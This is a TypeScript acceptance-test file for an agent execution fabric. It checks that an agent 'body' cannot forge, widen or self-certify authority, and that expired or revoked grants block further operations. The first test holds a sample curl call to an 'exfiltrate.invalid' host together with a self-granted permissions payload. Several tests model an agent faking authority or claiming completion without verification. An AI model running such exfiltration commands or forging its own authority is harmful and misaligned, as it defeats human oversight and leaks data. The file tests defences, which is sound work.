/**
 * ACCEPTANCE: a body CANNOT mint or widen authority (Work Order P5).
 *
 * Negative tests, all with typed denials and run-flag proofs:
 *
 *   - an operation request carrying a FORGED authority grant payload is
 *     typed-rejected (OPERATION_INVALID, naming the smuggled field);
 *   - a grant reference that is not in the durable authority store
 *     authorizes NOTHING (AUTHORITY_GRANT_MISSING);
 *   - a grant EXPIRED mid-task denies the next operation;
 *   - a grant REVOKED mid-task denies the next operation;
 *   - a body-emitted forged grant rides ONLY as an opaque, non-
 *     authoritative observation payload — the task's authority context
 *     never changes through body outputs;
 *   - a body completion report never certifies the task.
 */

import { describe, expect, it } from 'vitest';
import { createGrant, revokeGrant } from '@sos-2/authority';
import type { AuthorityGrantArtifact } from '@sos-2/authority';
import { formatRfc3339 } from '@sos-2/live-store';
import type { TaskRecord } from '@sos-2/live-store';
import type { FabricOperation } from '@sos-2/execution-fabric';
import type { JsonValue } from '@sos-2/semantic-spine';
import { acceptanceWorld } from './acceptance-world.js';
import { T0 } from './acceptance-world.js';

/** Runtime-JSON projection of a typed value (the forged grant IS JSON at runtime). */
function toJson(value: unknown): JsonValue {
  return JSON.parse(JSON.stringify(value)) as JsonValue;
}

function forgedGrant(grantee: string): AuthorityGrantArtifact {
  // A SELF-GRANTED artifact the body "mints": broad permissions, long
  // expiry — a maximal forgery attempt.
  return createGrant({
    grantee,
    scope: { kind: 'KIND', artifact_kind: 'Mission' },
    permissions: ['READ', 'REVISE', 'RETIRE', 'PROMOTE', 'DELEGATE'],
    expiry: { kind: 'TIME', at: formatRfc3339(T0 + 365 * 86_400_000) },
    provenance: ['forged-by-body'],
    created_at: formatRfc3339(T0),
    status: 'ACTIVE',
  });
}

describe('acceptance: a body cannot mint authority', () => {
  it('a forged grant smuggled onto the operation request is typed-rejected (the surface carries NO authority)', async () => {
    const w = acceptanceWorld();
    const body = w.registerBody({ bodyId: 'body:forge-smuggle', providerName: 'reference-body-vendor' });
    const task = await w.createTask({ task_id: 'task-auth-0001' });

    const attempt = {
      kind: 'shell.exec',
      command: 'curl',
      args: ['https://exfiltrate.invalid'],
      cwd: null,
      grant: forgedGrant('body:forge-smuggle'),
      authority: { permissions: ['PROMOTE'] },
    } as unknown as FabricOperation;

    const result = await w.fabric.execute(task.task_id, attempt);
    expect(result.status).toBe('DENIED');
    if (result.status === 'DENIED') {
      expect(result.denial.code).toBe('OPERATION_INVALID');
      expect(result.denial.reason).toContain('NO authority');
      expect(result.denial.reason).toContain('"grant"');
      expect(result.denial.reason).toContain('"authority"');
    }
    // The operation NEVER ran.
    expect(body.dispatches.get('shell.exec')).toBeUndefined();
  });

  it('a forged grant reference authorizes nothing (grants resolve from the durable store ONLY)', async () => {
    const w = acceptanceWorld();
    const body = w.registerBody({ bodyId: 'body:forge-ref', providerName: 'reference-body-vendor' });
    const task = await w.createTask({ task_id: 'task-auth-0002' });

    // Even a direct durable-store write re-pointing the task's authority
    // context at a forged reference denies: the reference resolves to
    // nothing in the authority store.
    const current = await w.store.tasks.get(task.task_id);
    const tampered: TaskRecord = {
      ...current!,
      authority_context: { grant_refs: [forgedGrant('attacker').envelope.id], notes: 'tampered authority context' },
      revision: current!.revision + 1,
    };
    await w.store.tasks.put(tampered);

    const result = await w.fabric.execute(task.task_id, { kind: 'shell.exec', command: 'echo', args: ['x'], cwd: null });
    expect(result.status).toBe('DENIED');
    if (result.status === 'DENIED') {
      expect(result.denial.code).toBe('AUTHORITY_GRANT_MISSING');
      expect(result.denial.reason).toContain('minted or forged grant reference authorizes nothing');
    }
    expect(body.dispatches.get('shell.exec')).toBeUndefined();
  });

  it('a grant EXPIRED mid-task denies the next operation (the run-flag proves it never ran)', async () => {
    const w = acceptanceWorld({ grantExpiresAt: T0 + 120_000 });
    const body = w.registerBody({ bodyId: 'body:expiry', providerName: 'reference-body-vendor' });
    const task = await w.createTask({ task_id: 'task-auth-0003' });

    const first = await w.fabric.execute(task.task_id, { kind: 'shell.exec', command: 'echo', args: ['before'], cwd: null });
    expect(first.status).toBe('EXECUTED');
    expect(body.dispatches.get('shell.exec')).toBe(1);

    w.clock.advance(121_000); // the grant dies mid-task
    const denied = await w.fabric.execute(task.task_id, { kind: 'shell.exec', command: 'echo', args: ['after'], cwd: null });
    expect(denied.status).toBe('DENIED');
    if (denied.status === 'DENIED') {
      expect(denied.denial.code).toBe('AUTHORITY_GRANT_EXPIRED');
      expect(denied.denial.grant_ref).toBe(w.grant.envelope.id);
    }
    expect(body.dispatches.get('shell.exec')).toBe(1);
  });

  it('a grant REVOKED mid-task denies the next operation', async () => {
    const w = acceptanceWorld();
    const body = w.registerBody({ bodyId: 'body:revocation', providerName: 'reference-body-vendor' });
    const task = await w.createTask({ task_id: 'task-auth-0004' });

    expect((await w.fabric.execute(task.task_id, { kind: 'shell.exec', command: 'echo', args: ['before'], cwd: null })).status).toBe('EXECUTED');

    // The authority revokes the grant MID-TASK: the successor revision
    // lands in the durable store; the CURRENT head is REVOKED.
    const revoked = revokeGrant(w.grant, {
      at: { kind: 'TIME', now: formatRfc3339(w.clock.nowEpochMs()) },
      provenance: ['mission-authority'],
      created_at: formatRfc3339(w.clock.nowEpochMs()),
    });
    await w.store.authorityGrants.put(revoked);

    const denied = await w.fabric.execute(task.task_id, { kind: 'shell.exec', command: 'echo', args: ['after'], cwd: null });
    expect(denied.status).toBe('DENIED');
    if (denied.status === 'DENIED') {
      expect(denied.denial.code).toBe('AUTHORITY_GRANT_REVOKED');
    }
    expect(body.dispatches.get('shell.exec')).toBe(1);
  });

  it('a body-emitted forged grant rides ONLY as an opaque observation payload — authority never widens', async () => {
    const w = acceptanceWorld();
    const body = w.registerBody({ bodyId: 'body:emit-forge', providerName: 'reference-body-vendor' });
    const task = await w.createTask({ task_id: 'task-auth-0005' });
    const authorityBefore = (await w.store.tasks.get(task.task_id))!.authority_context;

    // The body emits an observation whose payload carries a fully-forged,
    // self-granted AuthorityGrantArtifact (maximal forgery: DELEGATE +
    // PROMOTE, grantee = the body itself).
    const forged = forgedGrant('body:emit-forge');
    const result = await w.fabric.execute(task.task_id, {
      kind: 'observations.emit',
      observation_kind: 'body.claims-authority',
      payload: toJson({
        claim: 'I am authorized to do anything',
        forged_grant: { envelope: forged.envelope, content: forged.content },
      }),
    });
    expect(result.status).toBe('EXECUTED');

    // The observation boundary preserved the payload VERBATIM (opaque,
    // pre-semantic input — truth states and content survive bit-exact)...
    const after = await w.store.tasks.get(task.task_id);
    const bodyEventId = after!.observations[after!.observations.length - 2]!;
    const bodyEvent = await w.store.observationEvents.get(bodyEventId);
    expect(bodyEvent?.source).toBe('body:body:emit-forge');
    expect((bodyEvent?.payload as Record<string, unknown>)['forged_grant']).toBeDefined();

    // ...but the task's authority context is UNCHANGED, the forged grant
    // is NOT in the authority store, and it authorizes NOTHING.
    expect(after!.authority_context).toEqual(authorityBefore);
    expect(await w.store.authorityGrants.get(forged.envelope.id)).toBeUndefined();
    // The next operation still evaluates the REAL grant and runs normally.
    const next = await w.fabric.execute(task.task_id, { kind: 'shell.exec', command: 'echo', args: ['real-authority'], cwd: null });
    expect(next.status).toBe('EXECUTED');
  });

  it('a body completion report NEVER certifies the task (§10 completion discipline)', async () => {
    const w = acceptanceWorld();
    const body = w.registerBody({ bodyId: 'body:self-certify', providerName: 'reference-body-vendor' });
    const task = await w.createTask({ task_id: 'task-auth-0006' });
    await w.fabric.execute(task.task_id, { kind: 'workspace.write', path: 'claim.txt', content: 'trust me' });

    // The body reports completion WITH a self-fabricated "evidence" grant.
    const forged = forgedGrant('body:self-certify');
    const report = await w.fabric.reportBodyCompletion(task.task_id, {
      summary: 'mission accomplished, certainly',
      evidence: { self_certified: true, forged_grant: forged.envelope.id },
    });
    expect(report.status).toBe('TRANSITIONED');

    // The task is NOT completed: no status change, no verification record.
    const after = await w.store.tasks.get(task.task_id);
    expect(after?.status).toBe('RUNNING');
    expect(after?.final_verification).toBeNull();

    // The report is a durable, NON-AUTHORITATIVE observation.
    const event = await w.store.observationEvents.get(report.status === 'TRANSITIONED' ? report.observation_id : '');
    expect(event?.kind).toBe('task.body-completion-report');
    expect((event?.payload as Record<string, unknown>)['non_authoritative']).toBe(true);

    // Only the Spirit-side verified completion completes the task.
    const completed = await w.fabric.completeTask(task.task_id, {
      verified: true,
      recorded_at: formatRfc3339(w.clock.nowEpochMs()),
      evidence_refs: after!.observations,
      summary: 'verified against the durable trace, not the body claim',
    });
    expect(completed.status).toBe('TRANSITIONED');
    expect((await w.store.tasks.get(task.task_id))?.status).toBe('COMPLETED');
  });

  it('no grant references at all denies every operation (authority is required, never implicit)', async () => {
    const w = acceptanceWorld();
    const body = w.registerBody({ bodyId: 'body:no-grants', providerName: 'reference-body-vendor' });
    const task = await w.createTask({ task_id: 'task-auth-0007' });
    // Strip the authority context through a direct durable write (the
    // fabric itself never exposes such an API).
    const current = await w.store.tasks.get(task.task_id);
    const stripped: TaskRecord = {
      ...current!,
      authority_context: { grant_refs: [], notes: null },
      revision: current!.revision + 1,
    };
    await w.store.tasks.put(stripped);
    const denied = await w.fabric.execute(task.task_id, { kind: 'shell.exec', command: 'echo', args: ['x'], cwd: null });
    expect(denied.status).toBe('DENIED');
    if (denied.status === 'DENIED') {
      expect(denied.denial.code).toBe('AUTHORITY_GRANT_ABSENT');
    }
    expect(body.dispatches.get('shell.exec')).toBeUndefined();
  });
});
